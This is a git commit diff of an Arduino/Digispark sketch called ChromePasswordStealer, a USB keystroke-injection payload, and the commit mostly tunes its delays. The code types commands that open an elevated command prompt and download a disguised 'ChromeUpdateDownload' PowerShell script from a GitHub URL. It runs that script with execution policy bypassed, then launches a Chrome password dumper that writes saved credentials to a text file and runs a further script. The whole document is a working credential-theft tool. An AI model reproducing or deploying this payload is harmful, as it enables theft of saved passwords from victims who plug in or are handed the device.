e6a43960efc0efff35931f705019b0ce26ce6023
abdulaziesmuslim <abdulazies55@gmail.com>
2020-05-22 19:03:01 +0700

    teros

--- ChromePasswordStealer/ChromePasswordStealer.ino
+++ ChromePasswordStealer/ChromePasswordStealer.ino
@@ -4,28 +4,28 @@ void setup()
 {
   pinMode(1, OUTPUT); //LED on Model A
   digitalWrite(1, HIGH);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(100);
   digitalWrite(1, LOW);
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(100);
   DigiKeyboard.println("powershell Start-Process cmd -Verb RunAs");
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);  
+  DigiKeyboard.delay(500);
   DigiKeyboard.println("cd / & mkdir chrome & cd chrome");
   DigiKeyboard.delay(50);
   DigiKeyboard.println("echo (wget 'https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
-  DigiKeyboard.delay(50);
+  DigiKeyboard.delay(200);
   DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
   DigiKeyboard.delay(20);  
   DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File ChromeUpdateDownload.ps1");
   DigiKeyboard.delay(50);
-  DigiKeyboard.println("update.exe /stext maintenance.txt");
+  DigiKeyboard.println("ChromePass.exe /stext maintenance.txt");
   DigiKeyboard.delay(50);
   DigiKeyboard.println("powershell ./maintenance.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
